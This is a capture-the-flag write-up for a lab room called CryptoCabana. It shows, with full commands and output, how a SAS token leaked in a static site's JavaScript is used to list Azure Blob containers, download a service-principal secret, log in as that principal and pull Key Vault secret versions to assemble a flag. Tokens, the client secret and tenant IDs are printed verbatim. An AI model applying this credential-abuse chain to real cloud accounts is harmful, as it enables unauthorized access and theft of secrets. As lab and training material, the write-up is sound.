# CryptoCabana

He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.

after configuring the azure shell as instructed in the room introduction then i performed these steps : 

we will get index.html using the curl command : 

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ -o index.html
```

we named it index.html because this is an static website .

with this we will try to extract all the links from the index.html 

```bash
grep -oE '(src|href)="[^"]+"' index.html
```

we got this output : 

![image.png](image.png)

now to get the app.js we will use ; 

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js -o app.js
```

now read the app.js 

what this app.js contains : 

```bash
usr-08053996 [ ~ ]$ cat app.js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D';

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");
  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed — network error.";
    });
}
```

app.js file :

- defines the azure storage account

```bash
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
```

- uses the container

```bash
const BACKUPS_CONTAINER = "backups";
```

- Stores a SAS token in the frontend:

```bash
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z..."
```

- when the user clicks backup → reads the phrase from the textbox → creates a filename like :

```bash
backup-1754400000000.txt
```

- Sends a PUT request directly to Azure Blob Storage:

```bash
https://cryptocabanaf5scjagc.blob.core.windows.net/backups/backup-xxxxxxxx.txt?<SAS>
```

### Decoding the SAS token :

the important permissions are : 

```bash
sp=r1
```

azure permission lettters : 

| Permission | Meaning |
| --- | --- |
| r | Read |
| l | List |
| w | Write |
| c | Create |
| d | Delete |
| a | Add |

this token has only :

r → read 

l → list 

now we will list storage using this : 

```bash
az storage blob list --account-name cryptocabanaf5scjagc --container-name '$web' --auth-mode login --output table
```

we used $web because the static sites like in this room are mapped to this container “web” 

in the output , we got this : 

```bash
You do not have the required permissions needed to perform this operation.
Depending on your operation, you may need to be assigned one of the following roles:
    "Storage Blob Data Owner"
    "Storage Blob Data Contributor"
    "Storage Blob Data Reader"
    "Storage Queue Data Contributor"
    "Storage Queue Data Reader"
    "Storage Table Data Contributor"
    "Storage Table Data Reader"

If you want to use the old authentication method and allow querying for the right account key, please use the "--auth-mode" parameter and "key" value.
```

now we will try using the curl ; 

```bash
curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/?comp=list&resttype=container
```

we are doing this because we got permission errors while  listing the container using the previous command  : now in the output of this command we got only the html code of the page 

now we did this : 

```bash
SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
```

we created a new token variable and want the system to store it , now will also create another ACCOUNT variable with the value as the target account name : 

```bash
ACCOUNT="cryptocabanaf5scjagc"
```

then : 

```bash
curl -s "https://$ACCOUNT.blob.core.windows.net/?comp=list&$SAS"
```

for this we will get the xml outpu file  : 

```bash
usr-08053996 [ ~ ]$ curl -s "https://$ACCOUNT.blob.core.windows.net/?comp=list&$SAS"
<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/"><Containers><Container><Name>$web</Name><Properties><Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified><Etag>"0x8DEE367BD220F4D"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope><DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold><ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled></Properties></Container><Container><Name>backups</Name><Properties><Last-Modified>Thu, 16 Jul 2026 18:26:22 GMT</Last-Modified><Etag>"0x8DEE367BCEBC6CC"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope><DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold><ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled></Properties></Container><Container><Name>vault</Name><Properties><Last-Modified>Thu, 16 Jul 2026 18:26:23 GMT</Last-Modified><Etag>"0x8DEE367BD5C639F"</Etag><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><DefaultEncryptionScope>$account-encryption-key</DefaultEncryptionScope><DenyEncryptionScopeOverride>false</DenyEncryptionScopeOverride><HasImmutabilityPolicy>false</HasImmutabilityPolicy><HasLegalHold>false</HasLegalHold><ImmutableStorageWithVersioningEnabled>false</ImmutableStorageWithVersioningEnabled></Properties></Container></Containers><NextMarker /></EnumerationResults>usr-08053996 [ ~ ]$ 
```

in this we have to find hidden keys as given in the room hint “Follow that trust somewhere the kiosk's own page never once points you.” → this is for the xml file 

 “ Somewhere in there is a second, more valuable set of keys — and a vault that won't give up the real values on the first ask.” → for finding the hidden key in the xml file 

now in the xml file output we got name of the container that is “vault” 

now we will use the same command but with the vault listing : 

```bash
curl -s "https://$ACCOUNT.blob.core.windows.net/vault?restype=container&comp=list&$SAS"
```

we got this another xml : 

```bash
usr-08053996 [ ~ ]$ curl -s "https://$ACCOUNT.blob.core.windows.net/vault?restype=container&comp=list&$SAS"         curl -s "https://$ACCOUNT.blob.core.windows.net/vault?restype=container&comp=list&$SAS"
<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="vault"><Blobs><Blob><Name>backup-service-account.json</Name><Properties><Creation-Time>Sun, 19 Jul 2026 15:20:05 GMT</Creation-Time><Last-Modified>Sun, 19 Jul 2026 15:20:06 GMT</Last-Modified><Etag>0x8DEE5A93715D688</Etag><Content-Length>360</Content-Length><Content-Type>application/json</Content-Type><Content-Encoding /><Content-Language /><Content-CRC64 /><Content-MD5 /><Cache-Control /><Content-Disposition /><BlobType>BlockBlob</BlobType><AccessTier>Hot</AccessTier><AccessTierInferred>true</AccessTierInferred><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><ServerEncrypted>true</ServerEncrypted></Properties><OrMetadata /></Blob><Blob><Name>seed_phrase.txt</Name><Properties><Creation-Time>Thu, 16 Jul 2026 18:26:37 GMT</Creation-Time><Last-Modified>Thu, 16 Jul 2026 18:26:38 GMT</Last-Modified><Etag>0x8DEE367C6C15B35</Etag><Content-Length>88</Content-Length><Content-Type>application/octet-stream</Content-Type><Content-Encoding /><Content-Language /><Content-CRC64 /><Content-MD5 /><Cache-Control /><Content-Disposition /><BlobType>BlockBlob</BlobType><AccessTier>Hot</AccessTier><AccessTierInferred>true</AccessTierInferred><LeaseStatus>unlocked</LeaseStatus><LeaseState>available</LeaseState><ServerEncrypted>true</ServerEncrypted></Properties><OrMetadata /></Blob></Blobs><NextMarker /></EnumerationResults>usr-08053996 [ ~ ]$ 
```

in this we got a text file name : seed_phrase.txt 

and a backup-service-account.json 

now use :

```bash
curl -s "https://$ACCOUNT.blob.core.windows.net/vault/backup-service-account.json?$SAS"
```

now we got client secret  and other important informations : 

```bash
usr-08053996 [ ~ ]$ curl -s "https://$ACCOUNT.blob.core.windows.net/vault/backup-service-account.json?$SAS"
{"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5","client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg","key_vault_name":"ccabana-kv-f5scjagc","key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/","note":"CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT","tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"}usr-08053996 [ ~ ]$ 
```

now find what is in the seed_phrase.txt 

```bash
curl -s "https://$ACCOUNT.blob.core.windows.net/vault/seed_phrase.txt?$SAS"
```

got this in the output : 

```bash
velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

this is not useful . 

now we have got a noter in the above json file 

now 

```bash
az login --service-principal -u user_id -p 'client_secret' --tenant tenanat_id
```

```bash
az login --service-principal -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 -p 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

got this in the output :

```bash
usr-08053996 [ ~ ]$ az login --service-principal -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 -p 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446az login --service-principal -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 -p 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-CTF",
    "state": "Enabled",
    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

now check :

```bash
az account show 
```

got this in the output ;

```bash
usr-08053996 [ ~ ]$ az account show 
{
  "environmentName": "AzureCloud",
  "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "id": "2492269a-2948-46fd-aae3-68c9b066443a",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Az-Subs-CTF",
  "state": "Enabled",
  "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "user": {
    "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
    "type": "servicePrincipal"
  }
}
```

now :

```bash
KV=ccabana-kv-f5scjagc
```

then :

```bash
az keyvault secret list --vault-name $KV -o table 
```

got this in the output ;

```bash
usr-08053996 [ ~ ]$ az keyvault secret list --vault-name $KV -o table 
Name         Id                                                               ContentType    Enabled    Expires
-----------  ---------------------------------------------------------------  -------------  ---------  -------------------------
key-shard-1  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1                 True
key-shard-2  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2                 True
key-shard-3  https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3                 True
master-key   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key                  True       2020-01-01T00:00:00+00:00
```

now : 

```bash
nano thm.sh 
KV="ccabana-kv-f5scjagc"
for name in key-shared-1 key-shared-2 key-shared-3 master-key; do
        echo "=== $name ==="
        az keyvault secret list-versions --vault-name $KV --name "$name" -o table
done
```

then : 

```bash
chmod +x thm.sh
```

then run the script : 

```bash
./thm.sh
```

in the output we got shared key 2 two time means this is the roatated key ; 

![image.png](image%201.png)

now 

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json \
--query "[].{version:id, created:attributes.created, updated:attributes.updated, enabled:attributes.enabled}"

```

we got the version of key shared 2 :

![image.png](image%202.png)

now grab them :

![image.png](image%203.png)

got a part of the flag :

![image.png](image%204.png)

we have to combine the keys with the master key : 

![image.png](image%205.png)

```bash
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```